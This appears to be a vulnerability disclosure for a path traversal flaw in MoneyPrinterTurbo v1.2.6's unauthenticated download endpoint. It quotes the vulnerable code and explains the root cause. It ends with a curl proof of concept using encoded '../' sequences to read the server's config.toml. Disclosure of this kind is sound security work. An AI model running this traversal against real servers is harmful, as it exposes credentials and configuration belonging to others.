A critical path traversal vulnerability (CWE-22) has been identified in the `/download/{file_path:path}` endpoint of MoneyPrinterTurbo. This vulnerability allows unauthenticated attackers to read arbitrary files on the server filesystem, potentially leading to complete system compromise through exposure of sensitive configuration files, source code, and credentials.

version: v1.2.6

## Affected Code

```python
# https://github.com/harry0703/MoneyPrinterTurbo/blob/v1.2.6/app/controllers/v1/video.py#L269
@router.get("/download/{file_path:path}")
async def download_video(_: Request, file_path: str):
    """
    download video
    :param _: Request request
    :param file_path: video file path, eg: /cd1727ed-3473-42a2-a7da-4faafafec72b/final-1.mp4
    :return: video file
    """
    tasks_dir = utils.task_dir()  # Returns <root>/storage/tasks
    video_path = os.path.join(tasks_dir, file_path)  # VULNERABLE: Direct path joining
    file_path = pathlib.Path(video_path)
    filename = file_path.stem
    extension = file_path.suffix
    headers = {"Content-Disposition": f"attachment; filename={filename}{extension}"}
    return FileResponse(
        path=video_path,
        headers=headers,
        filename=f"{filename}{extension}",
        media_type=f"video/{extension[1:]}",
    )
```

## Root Cause Analysis

The vulnerability occurs because:

1. **No Authentication Required**: The endpoint has no authentication checks (line 35 shows auth is commented out)
2. **Direct Path Construction**: The `file_path` parameter is directly joined with the tasks directory using `os.path.join()` without any validation or sanitization
3. **No Traversal Prevention**: The code does not check for `../` sequences or absolute paths
4. **No File Existence Validation**: While FastAPI's `FileResponse` handles file not found errors, it doesn't prevent accessing files outside the intended directory


An attacker can read sensitive configuration files:

```bash
curl "http://target:8080/api/v1/download/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fMoneyPrinterTurbo%2fconfig.toml"
```
